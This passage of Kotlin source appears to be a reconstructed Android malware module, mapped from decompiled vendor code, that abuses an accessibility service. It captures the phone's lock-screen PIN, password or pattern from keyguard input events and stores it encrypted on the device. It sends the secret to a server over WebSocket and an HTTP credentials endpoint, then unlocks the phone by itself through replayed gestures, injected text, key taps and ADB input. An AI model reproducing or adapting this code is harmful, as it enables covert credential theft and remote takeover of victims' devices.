        val currPadding = if (currH < currParentH) currParentH - currH else 0
        val currCenterX = if (screenWidth > 0) screenWidth / 2 else (currW / 2) + currScreen.left
        val currCenterY = (currPadding / 2) + (currH / 2) + currScreen.top

        val scale = currMinDim.toFloat() / origMinDim.toFloat()
        Log.d(TAG, "transformPatternPoints: scale=$scale, origCenter=($origCenterX,$origCenterY), currCenter=($currCenterX,$currCenterY)")

        return points.map { point ->
            val newX = ((point.x - origCenterX) * scale + currCenterX).toInt()
            val newY = ((point.y - origCenterY) * scale + currCenterY).toInt()
            android.graphics.Point(newX, newY)
        }
    }

    /**
     * 检查文本是否包含遮蔽字符（•, ●, ⬤, *, ◉ 等）。
     * vendor: inline in b2/d6 — containsMaskChars
     */
    fun containsMaskChars(text: String): Boolean {
        if (text.isEmpty()) return false
        for (mask in MASK_CHARS) {
            if (text.contains(mask)) return true
        }
        return false
    }

    /**
     * 替换密码遮蔽符为星号。
     * vendor: d4 — maskPasswordChars
     */
    fun maskPasswordChars(str: String): String? {
        if (str.isEmpty() || str.length > 20) return null
        return str.replace("•", "*").replace("●", "*").replace("⬤", "*").replace("◉", "*")
    }

    /**
     * 通知密码捕获成功。
     * vendor: d5 — notifyPasswordCaptureSuccess
     */
    fun notifyPasswordCaptureSuccess() {
        try {
            // vendor: d5 — 获取 dqtvuisjd 实例, 设置 k5=false, k2=0, 写入 SharedPreferences
            val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance()
            if (svc == null) {
                Log.w(TAG, "⚠️ dqtvuisjd 实例为 null")
                return
            }
            Log.d(TAG, "✅ [onPasswordCaptureSuccess] 密码捕获成功，停止密码监听")
            svc.isCipherCaptureEnabled = false
            svc.cipherCaptureAttemptCount = 0
            svc.getSharedPreferences("cipher_prefs", 0)
                .edit()
                .putBoolean("password_captured", true)
                .apply()
        } catch (e: Exception) {
            Log.w(TAG, "❌ 通知密码捕获成功失败: ${e.message}")
        }
    }

    /**
     * 通过 WebSocket 发送密码。
     * vendor: d8 — sendPasswordViaWebSocket (40 行)
     *
     * 构造 JSON 并通过 NetworkManager.c4("status", json) 发送。
     */
    fun sendPasswordViaWebSocket(cipher: Any?) {
        try {
            if (cipher == null) return
            val map = cipher as? Map<*, *> ?: return
            // vendor: d8 — 通过 dqtvuisjd.m211471g5() 获取 NetworkManager
            val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance()
            val networkManager = svc?.getNetworkManager()
            if (networkManager == null) {
                Log.w(TAG, "NetworkManager 未初始化，跳过 WebSocket 发送")
                return
            }
            val quality = map["quality"] as? String ?: return
            val text = map["text"] as? String
            @Suppress("UNCHECKED_CAST")
            val patternIndices = (map["patternIndices"] as? List<*>)?.filterIsInstance<Int>()
            val timestamp = map["timestamp"] as? Long ?: System.currentTimeMillis()
            val isLocked = map["isLocked"] as? Boolean ?: true

            // vendor: 确定类型
            val type = when {
                quality == QUALITY_PATTERN -> "pattern"
                quality == QUALITY_NUMERIC || quality == "PASSWORD_QUALITY_NUMERIC_COMPLEX" -> "pin"
                quality == QUALITY_ALPHA -> "password"
                else -> "unknown"
            }

            // vendor: 确定密码值
            val password = when {
                quality == QUALITY_PATTERN && patternIndices != null -> patternIndices.joinToString(",")
                text != null -> text
                else -> ""
            }

            val json = JSONObject()
            json.put("type", "system_lock_password")
            json.put("password", password)
            json.put("passwordType", type)
            json.put("inputMethod", "system_lock")
            json.put("timestamp", timestamp)
            json.put("cipherGradeCode", quality)
            json.put("isLocked", isLocked)

            // vendor: c0323a8M211471g5.m211658c4("status", json)
            networkManager.sendEvent("status", json)
            Log.d(TAG, "✅ 密码已通过WebSocket发送(status事件): type=$type, password=${"*".repeat(password.length)}")
        } catch (e: Exception) {
            Log.w(TAG, "发送密码到服务器失败: ${e.message}")
        }
    }

    /**
     * 通过 HttpManager 上传密码（路径 1）。
     * vendor: NetworkManager$sendPasswordData$1 → httpManager.uploadPasswordCapture(password, type, inputMethod, "", "", 100)
     *
     * 这是 vendor 三路上报的第 1 条路径，走 HttpManager 的 HMAC 认证 POST /api/sync/credentials。
     */
    fun uploadPasswordViaHttp(cipher: Any?) {
        try {
            if (cipher == null) return
            val map = cipher as? Map<*, *> ?: return
            val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance()
            val networkManager = svc?.getNetworkManager()
            if (networkManager == null) {
                Log.w(TAG, "NetworkManager 未初始化，跳过 HTTP 上传")
                return
            }
            val httpManager = networkManager.httpManager
            if (httpManager == null) {
                Log.w(TAG, "HttpManager 未初始化，跳过 HTTP 上传")
                return
            }

            val quality = map["quality"] as? String ?: return
            val text = map["text"] as? String
            @Suppress("UNCHECKED_CAST")
            val patternIndices = (map["patternIndices"] as? List<*>)?.filterIsInstance<Int>()

            // vendor: 确定类型
            val type = when {
                quality == QUALITY_PATTERN -> "pattern"
                quality == QUALITY_NUMERIC || quality == "PASSWORD_QUALITY_NUMERIC_COMPLEX" -> "pin"
                quality == QUALITY_ALPHA -> "password"
                else -> "unknown"
            }

            // vendor: 确定密码值
            val password = when {
                quality == QUALITY_PATTERN && patternIndices != null -> patternIndices.joinToString(",")
                text != null -> text
                else -> ""
            }

            val patternCipher = patternIndices?.joinToString(",")
            val isLocked = map["isLocked"] as? Boolean

            GlobalScope.launch(Dispatchers.IO) {
                try {
                    val result = httpManager.uploadPasswordCapture(
                        password = password,
                        passwordType = type,
                        inputMethod = "system_auth_capture",
                        appName = "",
                        packageName = "",
                        confidence = 100,
                        cipherGradeCode = quality,
                        patternCipher = patternCipher,
                        isLocked = isLocked
                    )
                    if (result.isSuccess) {
                        Log.d(TAG, "✅ 密码已通过 HTTP 上传: type=$type")
                    } else {
                        Log.w(TAG, "⚠️ HTTP上传密码失败: ${result.exceptionOrNull()?.message}")
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "❌ HTTP上传密码异常: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "uploadPasswordViaHttp 异常: ${e.message}")
        }
    }

    // ==================== 核心实例方法 ====================

    /**
     * 轮询验证解锁是否成功（20次×100ms）。
     * vendor: a0 — verifySuccess
     */
    fun verifySuccess(): Boolean {
        val counter = AtomicInteger(0)
        while (counter.incrementAndGet() < 20 && isStillInConfirmLock()) {
            try { Thread.sleep(100L) } catch (_: Exception) {}
        }
        val success = !isStillInConfirmLock()
        Log.d(TAG, "verifySuccess: $success (polled ${counter.get()} times)")
        return success
    }

    /**
     * 检查是否仍在锁屏确认界面。
     * vendor: a1 — isStillInConfirmLock
     */
    fun isStillInConfirmLock(): Boolean {
        try {
            val root = service.rootInActiveWindow ?: return false
            val pkg = root.packageName?.toString() ?: return false

            // 检查是否在 Settings 相关包名中
            if (pkg == "com.android.settings" ||
                pkg.contains("oplus.settings") || pkg.contains("oppo.settings") ||
                pkg.contains("coloros.settings") || pkg.contains("vivo.settings") ||
                pkg == "com.samsung.android.biometrics.app.setting") {
                // 检查是否有密码相关 UI 元素
                for (id in PIN_INPUT_IDS) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    if (!nodes.isNullOrEmpty()) return true
                }
                // 检查图案锁
                val patternNode = findPatternNodeByClass(root)
                if (patternNode != null) return true
                // 检查设置中的 PIN key
                val settingsKeys = listOf(
                    "com.android.settings:id/key0", "com.android.settings:id/key1",
                    "com.android.settings:id/lockPattern",
                    "com.android.settings:id/four_to_more_key0",
                    "com.android.settings:id/vivo_pin_confirm"
                )
                for (id in settingsKeys) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    if (!nodes.isNullOrEmpty()) return true
                }
                return false
            }
            // systemui 包名 → 检查 keyguard
            if (pkg == "com.android.systemui" || pkg.contains("hihonor")) {
                val windows = try { service.windows } catch (_: Exception) { null }
                if (windows != null) {
                    for (win in windows) {
                        if (win.isActive) {
                            val title = win.title?.toString() ?: ""
                            val lockActivities = listOf(
                                "ConfirmLockPassword", "ConfirmLockPattern",
                                "ConfirmVivoPin", "ChooseLockGeneric"
                            )
                            if (lockActivities.any { title.contains(it) }) return true
                            if (title == "android.inputmethodservice.SoftInputWindow") {
                                val focusNode = win.root?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                                if (focusNode?.isPassword == true) return true
                            }
                        }
                    }
                }
                // 直接查找 keyguard 元素
                for (id in PIN_INPUT_IDS) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    if (!nodes.isNullOrEmpty()) return true
                }
            }
            return false
        } catch (e: Exception) {
            Log.d(TAG, "isStillInConfirmLock error: ${e.message}")
            return false
        }
    }

    /**
     * 点击确认按钮。
     * vendor: a2 — clickConfirmButton
     */
    fun clickConfirmButton() {
        try {
            val root = service.rootInActiveWindow ?: return
            // 搜索 MIUI/Vivo/Samsung 确认按钮
            val confirmIds = listOf(
                "com.android.settings:id/footerRightButton",
                "com.android.settings:id/redacted_confirm_button",
                "com.android.settings:id/confirm_password_ok",
                "com.android.settings:id/vivo_pin_confirm",
                "com.android.settings:id/next_button",
                "android:id/button1"
            )
            for (id in confirmIds) {
                val node = findNodeByViewId(root, id)
                if (node != null && node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "✅ 点击确认按钮: $id")
                    return
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "clickConfirmButton error: ${e.message}")
        }
    }

    /**
     * 发送 Enter 键。
     * vendor: a4 — sendEnterKeypress
     */
    fun sendEnterKeypress(node: AccessibilityNodeInfo) {
        try {
            // 方式 1: ACTION_SET_TEXT + IME_ENTER
            val args = android.os.Bundle()
            args.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT, 0)
            node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, args)

            // 方式 2: 全局 ENTER
            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
            Log.d(TAG, "sendEnterKeypress 完成")
        } catch (e: Exception) {
            Log.w(TAG, "sendEnterKeypress error: ${e.message}")
        }
    }

    /**
     * 回放图案手势（最多 4 次尝试）。
     * vendor: a5 — playPatternGesture
     */
    fun playPatternGesture(points: ArrayList<android.graphics.PointF>): Boolean {
        if (points.size < 2) return false
        for (attempt in 0 until 4) {
            try {
                val path = android.graphics.Path()
                path.moveTo(points[0].x, points[0].y)
                for (i in 1 until points.size) {
                    path.lineTo(points[i].x, points[i].y)
                }
                val gesture = android.accessibilityservice.GestureDescription.Builder()
                    .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 10L, 400L))
                    .build()
                val result = service.dispatchGesture(gesture, null, null)
                if (result) {
                    Log.d(TAG, "playPatternGesture: 成功 (attempt $attempt)")
                    return true
                }
                Thread.sleep(200L)
            } catch (_: Exception) {}
        }
        Log.w(TAG, "playPatternGesture: 4次尝试全部失败")
        return false
    }

    /**
     * 自动解锁主流程。
     * vendor: a8 — autoUnlock (92 行)
     */
    fun autoUnlock(): Boolean {
        if (cipherConfirmed) {
            Log.d(TAG, "autoUnlock: 已有另一个autoUnlock正在运行，跳过本次调用")
            return false
        }
        cipherConfirmed = true
        try {
            val lockedCipher = loadCipherFromPrefs(true)
            val normalCipher = loadCipherFromPrefs(false)
            Log.d(TAG, "★★★ autoUnlock: lockedCipher=${lockedCipher != null}, normalCipher=${normalCipher != null}")

            var success = false
            if (lockedCipher != null) {
                Log.d(TAG, "★ 尝试使用 locked 密码自动输入...")
                success = tryConfirmLock(lockedCipher)
                Log.d(TAG, "★ locked密码结果: $success")
            }
            if (!success && normalCipher != null) {
                Log.d(TAG, "★ 尝试使用普通密码自动输入...")
                success = tryConfirmLock(normalCipher)
                Log.d(TAG, "★ normal密码结果: $success")
            }

            if (success) {
                Log.d(TAG, "✅ 已完成锁屏密码验证代理")
            } else {
                Log.w(TAG, "⚠️ autoUnlock 失败，保留已保存密码")
            }
            cipherConfirmed = false
            return success
        } catch (e: Exception) {
            Log.e(TAG, "autoUnlock 异常: ${e.message}")
            cipherConfirmed = false
            return false
        }
    }

    /**
     * 缓冲密码到 pendingCipher。
     * vendor: a9 — bufferCipher (87 行)
     *
     * JADX 逻辑:
     * 1. 如果已有 pending 且新文本是 +1 扩展，检查是否超过 1.5s 稳定期
     * 2. 如果超过 1.5s，拒绝扩展（可能是误触/系统残留事件）
     * 3. 根据 type 和文本内容确定 quality
     * 4. 创建新的 pendingCipher
     */
    fun bufferCipher(text: String, type: String) {
        val now = System.currentTimeMillis()

        // vendor: 检查 +1 扩展保护
        val existing = pendingCipher as? Map<*, *>
        if (existing != null) {
            val existingText = existing["text"] as? String
            if (existingText != null && text.length == existingText.length + 1 && text.startsWith(existingText)) {
                val gap = now - lastEventTime
                if (gap > EXPANSION_STABLE_THRESHOLD_MS) {
                    Log.w(TAG, "⚠️ 密码长度已稳定${gap}ms(>1.5s), 拒绝+1扩展(${existingText.length}→${text.length}位), 可能为误触/系统残留事件")
                    return
                }
            }
            // vendor: 如果长度变化，更新 lastEventTime
            if (existingText != null && text.length != existingText.length) {
                lastEventTime = now
            }
        }

        val quality = when (type) {
            "pattern" -> QUALITY_PATTERN
            "pin" -> {
                // vendor: 逐字符检查, 全是数字 → NUMERIC_COMPLEX, 否则 → ALPHANUMERIC
                if (CipherExtractor.isAllDigits(text)) QUALITY_NUMERIC else QUALITY_ALPHA
            }
            "password" -> QUALITY_ALPHA
            else -> QUALITY_NUMERIC
        }
        // vendor: C0598hx 数据类字段映射 → Map keys:
        // f56760a0=quality, f56761a1=text, f56762a2=patternIndices,
        // f56763a3=patternScreenPoints, f56764a4=isLocked, f56765a5=timestamp
        pendingCipher = mapOf(
            "quality" to quality,
            "text" to text,
            "type" to type,
            "isLocked" to true,
            "timestamp" to now,
            "patternIndices" to null
        )
        lastEventTime = now
        Log.d(TAG, "📦 密码已缓冲: type=$type, grade=$quality, length=${text.length} (等待验证后保存)")
    }

    /**
     * 使用 fallback 手势点击节点。
     * vendor: b0 — clickNodeWithFallback
     */
    fun clickNodeWithFallback(node: AccessibilityNodeInfo, desc: String): Boolean {
        try {
            if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                Log.d(TAG, "✅ 点击'$desc'(performAction)")
                return true
            }
            val rect = android.graphics.Rect()
            node.getBoundsInScreen(rect)
            val cx = rect.centerX().toFloat()
            val cy = rect.centerY().toFloat()
            if (cx <= 0f || cy <= 0f) {
                Log.w(TAG, "⚠️ 找到 $desc 但点击失败, clickable=${node.isClickable}")
                return false
            }
            val path = android.graphics.Path()
            path.moveTo(cx, cy)
            val gesture = android.accessibilityservice.GestureDescription.Builder()
                .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 50L))
                .build()
            val result = service.dispatchGesture(gesture, null, null)
            Log.d(TAG, "✅ 点击'$desc'(dispatchGesture at $cx,$cy): dispatched=$result")
            return result
        } catch (e: Exception) {
            Log.w(TAG, "clickNodeWithFallback 异常: ${e.message}")
            return false
        }
    }

    /**
     * 从 SharedPreferences 加载密码。
     * vendor: d0 — loadCipherFromPrefs (73 行)
     */
    fun loadCipherFromPrefs(isLocked: Boolean): Map<String, Any?>? {
        try {
            val key = if (isLocked) "cipher_locked" else "cipher_normal"
            val encrypted = prefs.getString(key, null) ?: return null
            val json = decryptAesGcm(encrypted) ?: return null
            val obj = org.json.JSONObject(json)
            return mapOf(
                "quality" to obj.optString("quality", ""),
                "text" to obj.optString("text", ""),
                "pattern" to (try { obj.optJSONArray("pattern")?.let { arr ->
                    (0 until arr.length()).map { arr.getInt(it) }
                } } catch (_: Exception) { null }),
                "screenPoints" to null,
                "isLocked" to obj.optBoolean("isLocked", false),
                "timestamp" to obj.optLong("timestamp", 0L)
            )
        } catch (e: Exception) {
            Log.w(TAG, "loadCipherFromPrefs error: ${e.message}")
            return null
        }
    }

    /**
     * 保存密码到 SharedPreferences。
     * vendor: d7 — saveCipherToPrefs (87 行)
     */
    fun saveCipherToPrefs(cipher: Any?) {
        try {
            val map = cipher as? Map<*, *> ?: return
            val json = org.json.JSONObject()
            json.put("quality", map["quality"])
            json.put("text", map["text"])
            json.put("isLocked", map["isLocked"])
            json.put("timestamp", map["timestamp"])

            val encrypted = encryptAesGcm(json.toString()) ?: return
            val isLocked = map["isLocked"] as? Boolean ?: true
            val key = if (isLocked) "cipher_locked" else "cipher_normal"
            prefs.edit().putString(key, encrypted).apply()
            Log.d(TAG, "✅ 密码已保存到本地: key=$key")
        } catch (e: Exception) {
            Log.w(TAG, "saveCipherToPrefs error: ${e.message}")
        }
    }

    /**
     * 删除本地存储的密码。
     * vendor: b4 — deleteCipherFromPrefs
     */
    fun deleteCipherFromPrefs(isLocked: Boolean) {
        val key = if (isLocked) "cipher_locked" else "cipher_normal"
        prefs.edit().remove(key).apply()
    }

    /**
     * 同步密码到 AppStatusManager。
     * vendor: e1 — syncToAppStatusManager
     */
    fun syncToAppStatusManager(cipher: Any?) {
        // vendor: e1 — C0107as.getInstance(context).a6(type, isLocked, value)
        try {
            val ctx = service.applicationContext ?: return
            val map = cipher as? Map<*, *> ?: return
            val isLocked = map["isLocked"] as? Boolean ?: true
            if (!isLocked) return

            val quality = map["quality"] as? String ?: ""
            val text = map["text"] as? String
            @Suppress("UNCHECKED_CAST")
            val patternIndices = map["patternIndices"] as? List<Int>

            // vendor: 类型映射
            val type = when {
                quality == QUALITY_NUMERIC || quality == "PASSWORD_QUALITY_NUMERIC_COMPLEX" -> {
                    if ((text?.length ?: 0) <= 4) "4pin" else "6pin"
                }
                quality == QUALITY_ALPHA -> "mixed"
                quality == QUALITY_PATTERN -> "pattern"
                else -> "unknown"
            }

            // vendor: 值映射 — 图案用逗号拼接, 文本直接使用
            val value = if (quality == QUALITY_PATTERN && patternIndices != null) {
                patternIndices.joinToString(",")
            } else {
                text ?: ""
            }

            AppStatusManager.getInstance(ctx).saveLockPassword(type, true, value)
            Log.d(TAG, "✅ 已同步锁屏密码到 AppStatusManager: type=$type, value=$value")
        } catch (e: Exception) {
            Log.w(TAG, "❌ 同步到 AppStatusManager 失败: ${e.message}")
        }
    }

    /**
     * 丢弃待处理密码（加锁版）。
     * vendor: b6 — discardPendingCipher
     */
    fun discardPendingCipher() {
        val overlay = patternOverlay
        if (overlay != null && !overlay.isReplaying) {
            if (!overlay.lock.tryLock()) {
                Log.w(TAG, "discardPendingCipher: tryLock 失败")
                return
            }
            try {
                discardPendingCipherInternal()
            } finally {
                overlay.lock.unlock()
            }
        } else {
            discardPendingCipherInternal()
        }
    }

    /**
     * 丢弃待处理密码（内部实现）。
     * vendor: b7 — discardPendingCipherInternal
     */
    fun discardPendingCipherInternal() {
        if (pendingCipher != null) {
            val quality = (pendingCipher as? Map<*, *>)?.get("quality")
            Log.w(TAG, "❌ 密码验证失败或超时，丢弃缓冲: type=$quality")
        } else {
            Log.d(TAG, "discardPendingCipher: 无缓冲密码可丢弃")
        }
        pendingCipher = null
        collectedEvents.clear()
        pinDigits.clear()
        passwordChars.clear()
        hasAlpha = false
        overlayPending = false
        Log.d(TAG, "🔷 pendingOverlayCreation 已重置，允许重建覆盖层")
    }

    /**
     * 通知密码页面已消失，重新弹出。
     * vendor: b8 — notifyPasswordPageDismissed
     */
    fun notifyPasswordPageDismissed() {
        // vendor: b8 — 检查监听状态和已有密码时间
        if (!isListening) {
            Log.d(TAG, "🔷 [doNotifyPasswordPageDismissed] 监听模式已关闭，取消重新弹出")
            return
        }
        var saved = loadCipherFromPrefs(true)
        if (saved == null) {
            saved = loadCipherFromPrefs(false)
        }
        if (saved != null) {
            val elapsed = System.currentTimeMillis() - (saved["timestamp"] as? Long ?: 0L)
            if (elapsed < 30000) {
                Log.d(TAG, "🔷 [doNotifyPasswordPageDismissed] 已有密码（${elapsed}ms前捕获），不再重新弹出")
                notifyPasswordCaptureSuccess()
                return
            }
        }
        try {
            Log.d(TAG, "🔷 [doNotifyPasswordPageDismissed] 通知 dqtvuisjd 重新弹出密码框")
            val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance()
            if (svc != null) {
                // vendor: c0290a0.m211495i9() — onPasswordPageDismissedByUser
                // 该方法检查 k5 和 k2 限制后重新启用监听
                val ccm = svc.cipherCaptureManager
                if (ccm != null) {
                    enableListening(ccm)
                }
            } else {
                Log.w(TAG, "⚠️ dqtvuisjd 实例为 null")
            }
        } catch (e: Exception) {
            Log.w(TAG, "❌ 通知重新弹出失败: ${e.message}")
        }
    }

    /**
     * 尝试确认锁屏（自动输入密码/图案）。
     * vendor: a3 — tryConfirmLock (328 行)
     *
     * 核心自动解锁方法:
     * 1. 判断密码类型 (PIN/password/pattern)
     * 2. 查找对应 UI 元素
     * 3. 输入密码并确认
     */
    fun tryConfirmLock(cipher: Map<String, Any?>): Boolean {
        try {
            val quality = cipher["quality"] as? String ?: return false
            val text = cipher["text"] as? String
            @Suppress("UNCHECKED_CAST")
            val patternIndices = cipher["patternIndices"] as? List<Int>
            @Suppress("UNCHECKED_CAST")
            val patternScreenPoints = cipher["patternScreenPoints"] as? List<android.graphics.Point>

            // vendor: a3 — 先检查是否为非 PIN/密码/图案
            if (quality != QUALITY_NUMERIC && quality != "PASSWORD_QUALITY_NUMERIC_COMPLEX"
                && quality != QUALITY_ALPHA && quality != QUALITY_PATTERN) {
                return false
            }

            // 1. 查找 "使用密码" 按钮（部分设备需要先点击）
            if (tryFindAndClickUseCredential()) {
                sleep500()
            }

            if (quality == QUALITY_PATTERN) {
                // vendor: 图案密码分支
                // 尝试 1: 使用 patternScreenPoints (坐标) 回放
                var gestureSuccess = false
                if (patternScreenPoints != null && patternScreenPoints.isNotEmpty()) {
                    val dedupedPoints = java.util.LinkedList(patternScreenPoints)
                    removeInvalidPatternPoints(dedupedPoints)
                    if (dedupedPoints.size >= 2) {
                        val root = service.rootInActiveWindow
                        if (root != null) {
                            // vendor: 等待页面稳定
                            for (i in 0 until 5) {
                                try { Thread.sleep(200L) } catch (_: Exception) {}
                            }
                            val refreshedRoot = service.rootInActiveWindow ?: root
                            val pkg = refreshedRoot.packageName?.toString() ?: "com.android.settings"

                            // 查找 lockPattern 节点
                            var patternNode = findNodeByViewIdAndClass(refreshedRoot, "$pkg:id/lockPattern", "android.view.View")
                            if (patternNode == null) {
                                for (altPkg in listOf("com.android.settings", "com.android.systemui", "com.coloros.settings", "com.oplus.settings")) {
                                    if (altPkg != pkg) {
                                        patternNode = findNodeByViewIdAndClass(refreshedRoot, "$altPkg:id/lockPattern", "android.view.View")
                                            ?: findNodeByViewId(refreshedRoot, "$altPkg:id/lockPattern")
                                        if (patternNode != null) break
                                    }
                                }
                            }
                            if (patternNode == null) patternNode = findPatternNodeByClass(refreshedRoot)

                            if (patternNode != null) {
                                val brand = Build.BRAND.lowercase(Locale.ROOT)
                                val boundsInScreen = cipher["boundsInScreen"] as? android.graphics.Rect
                                val boundsInParent = cipher["boundsInParent"] as? android.graphics.Rect

                                if (brand == "vivo" || brand == "iqoo" || boundsInScreen == null || boundsInParent == null) {
                                    // vivo/iqoo: 使用原始坐标
                                    val pts = ArrayList<android.graphics.PointF>()
                                    for (p in dedupedPoints) pts.add(android.graphics.PointF(p.x.toFloat(), p.y.toFloat()))
                                    Log.d(TAG, "使用原始坐标: ${pts.size}个点")
                                    gestureSuccess = playPatternGestureFull(pts)
                                } else {
                                    // 非 vivo: 坐标映射
                                    val nodeRect = android.graphics.Rect()
                                    if (Build.VERSION.SDK_INT >= 34) {
                                        patternNode.getBoundsInScreen(nodeRect) // getBoundsInWindow not available via a11y
                                    } else {
                                        patternNode.getBoundsInScreen(nodeRect)
                                    }
                                    val parentRect = android.graphics.Rect()
                                    patternNode.getBoundsInParent(parentRect)
                                    val mapped = transformPatternPoints(dedupedPoints, boundsInScreen, boundsInParent, nodeRect, parentRect)
                                    val pts = ArrayList<android.graphics.PointF>()
                                    for (p in mapped) pts.add(android.graphics.PointF(p.x.toFloat(), p.y.toFloat()))
                                    Log.d(TAG, "非Vivo坐标映射: ${pts.size}个点")
                                    gestureSuccess = playPatternGestureFull(pts)
                                }
                            } else {
                                Log.d(TAG, "tryPatternInput: 找不到 lockPattern 节点")
                            }
                        }
                    }
                }
                if (gestureSuccess) return true

                // 尝试 2: 使用 patternIndices 回退到网格计算
                if (patternIndices != null && patternIndices.isNotEmpty()) {
                    return tryPatternGridFallback(patternIndices)
                }
                return false
            }

            // vendor: PIN/密码分支
            if (text.isNullOrEmpty()) return false
            Log.d(TAG, "confirmLockByCipher: type=$quality, length=${text.length}")
            Thread.sleep(500L)

            // 尝试 1: EditText 输入
            Log.d(TAG, "J_autoInput: ★★★ 开始 tryEditTextInput ★★★")
            var editTextSuccess = false
            try {
                val root = service.rootInActiveWindow
                if (root != null) {
                    // vendor: 多种方式查找 EditText
                    var editNode = service.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                    if (editNode != null) {
                        val cn = editNode.className?.toString() ?: ""
                        if (!cn.contains("EditText") && !editNode.isEditable) {
                            editNode = findEditText(editNode) // 子树查找
                        }
                    }
                    if (editNode == null) editNode = findEditText(root)
                    if (editNode == null) editNode = findFocusedEditText(root)
                    if (editNode == null) editNode = findPasswordInputById(root)

                    if (editNode != null) {
                        editNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                        Thread.sleep(200L)
                        val args = android.os.Bundle()
                        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                        if (editNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)) {
                            Thread.sleep(300L)
                            // vendor: m211807a4 — input keyevent 66 (ENTER)
                            clickConfirmButtonFull()
                            if (verifySuccess()) {
                                Log.d(TAG, "tryEditTextInput: ✅ 密码输入成功！")
                                editTextSuccess = true
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "tryEditTextInput 异常: ${e.message}")
            }

            if (editTextSuccess) return true

            // 尝试 2: 通过按键逐个输入
            Log.d(TAG, "J_autoInput: ★★★ 开始 tryKeyNodeInput ★★★")
            if (tryKeyNodeInputFull(text, quality)) return true

            // 尝试 3: ADB input tap
            return tryAdbPinInputFull(text)
        } catch (e: Exception) {
            Log.e(TAG, "tryConfirmLock error: ${e.message}")
            return false
        }
    }

    /**
     * 查找并点击 "使用密码/PIN" 按钮。
     * vendor: e3 — tryFindAndClickUseCredential
     */
    fun tryFindAndClickUseCredential(): Boolean {
        try {
            val root = service.rootInActiveWindow ?: return false
            val buttonIds = listOf(
                "com.android.systemui:id/button_use_credential",
                "com.android.systemui:id/user_credential_header",
                "com.android.systemui:id/lock_icon"
            )
            for (id in buttonIds) {
                val node = findNodeByViewId(root, id)
                if (node != null && node.isClickable) {
                    return clickNodeWithFallback(node, "use_credential: $id")
                }
            }
            // 文本搜索: "使用密码" / "Use password"
            val descTexts = listOf("使用密码", "Use password", "使用PIN码", "Enter PIN")
            for (desc in descTexts) {
                val node = findNodeByContentDesc(root, desc)
                if (node != null) {
                    return clickNodeWithFallback(node, "use_credential: $desc")
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "tryFindAndClickUseCredential error: ${e.message}")
        }
        return false
    }

    /**
     * 尝试通过 ADB input tap 输入 PIN。
     * vendor: e2 — tryAdbPinInput
     */
    fun tryAdbPinInput(pin: String): Boolean {
        // vendor: e2 — 通过 ADB shell "input tap x y" 逐个点击数字键
        return tryAdbPinInputFull(pin)
    }

    /**
     * 通过无障碍节点逐键点击输入 PIN/密码。
     * vendor: e4 — tryKeyNodeInput (149 行)
     */
    fun tryKeyNodeInput(pin: String, packageName: String): Boolean {
        try {
            val root = service.rootInActiveWindow ?: return false
            for (ch in pin) {
                val digit = Character.digit(ch.code, 10)
                if (digit < 0) continue

                // 搜索数字键
                val keyIds = listOf(
                    "$packageName:id/key$digit",
                    "com.android.systemui:id/key$digit",
                    "com.android.settings:id/key$digit",
                    "com.android.systemui:id/VivoPinkey$digit",
                    "com.android.systemui:id/num$digit"
                )
                var clicked = false
                for (id in keyIds) {
                    val node = findNodeByViewId(root, id)
                    if (node != null) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        clicked = true
                        break
                    }
                }
                if (!clicked) {
                    Log.w(TAG, "tryKeyNodeInput: 未找到数字键 $digit")
                    return false
                }
                try { Thread.sleep(50L) } catch (_: Exception) {}
            }
            Log.d(TAG, "tryKeyNodeInput: 输入完成, ${pin.length} 位")
            return true
        } catch (e: Exception) {
            Log.w(TAG, "tryKeyNodeInput error: ${e.message}")
            return false
        }
    }

    /**
     * 处理 hover 事件（混合密码追加）。
     */
    private fun handleHoverEvent(event: AccessibilityEvent) {
        if (!isListening) return
        try {
            val km = service.getSystemService("keyguard") as? android.app.KeyguardManager ?: return
            if (!km.isKeyguardLocked) return
            val source = event.source ?: return
            val viewId = source.viewIdResourceName ?: ""

            // 检查是否是密码输入字段
            val passwordIds = listOf(
                "passwordEntry", "securityEditText", "miui_mixed_password_input_field",
                "lockPassword", "password_entry", "hw_password", "emui_password",
                "keyguard_password", "mixed_password"
            )
            if (!passwordIds.any { viewId.contains(it) }) {
                try { source.recycle() } catch (_: Exception) {}
                return
            }

            val text = source.text?.toString() ?: run {
                try { source.recycle() } catch (_: Exception) {}
                return
            }
            val cleaned = Regex("[•●⬤◉﹒＊*]").replace(text, "")
            if (cleaned.isNotEmpty()) {
                for (ch in cleaned) {
                    collectedEvents.add(event) // 记录事件
                    passwordChars.add(ch.toString())
                    if (ch.isLetter()) hasAlpha = true
                    Log.d(TAG, "🔤 [HOVER]混合密码追加: $ch (当前=${passwordChars.joinToString("")})")
                }
            } else if (passwordChars.isNotEmpty()) {
                passwordChars.removeAt(passwordChars.size - 1)
                Log.d(TAG, "🔙 [HOVER]退格: 剩余=${passwordChars.joinToString("")}")
            }
